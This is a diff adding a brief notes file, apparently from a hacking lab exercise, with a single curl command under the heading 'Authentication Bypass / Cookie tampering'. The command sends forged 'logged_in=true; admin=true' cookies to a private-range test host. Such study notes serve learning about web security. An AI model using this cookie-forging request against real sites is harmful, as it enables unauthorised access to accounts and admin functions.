@@ -1,0 +1,6 @@
+curl_commands
+
+Authentication Bypass
+
+Cookie tampering
+curl -H "Cookie: logged_in=true; admin=true" http://10.10.46.230/cookie-test
